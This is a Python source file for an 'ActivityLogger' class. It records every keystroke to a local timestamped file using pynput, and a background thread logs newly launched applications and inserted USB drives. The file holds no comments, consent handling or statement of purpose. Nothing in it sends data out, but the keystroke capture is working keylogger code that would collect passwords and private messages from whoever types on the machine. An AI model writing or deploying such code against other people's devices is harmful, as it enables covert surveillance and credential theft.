from pynput import keyboard
import psutil
import time
import os
from datetime import datetime
import threading

class ActivityLogger:
    def __init__(self, config):
        self.log_file = os.path.join(config.log_dir, "activity_log.txt")

    def log(self, text):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {text}\n")

    def on_press(self, key):
        try:
            self.log(f"Key: {key.char}")
        except AttributeError:
            self.log(f"Special Key: {key}")

    def log_apps_and_usb(self):
        known_apps = set()
        known_disks = set()

        while True:
            for proc in psutil.process_iter(['name']):
                name = proc.info['name']
                if name and name not in known_apps:
                    known_apps.add(name)
                    self.log(f"App launched: {name}")

            drives = {d.device for d in psutil.disk_partitions() if 'removable' in d.opts}
            new_disks = drives - known_disks
            for d in new_disks:
                self.log(f"USB inserted: {d}")
            known_disks = drives

            time.sleep(5)

    def run(self):
        threading.Thread(target=self.log_apps_and_usb, daemon=True).start()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
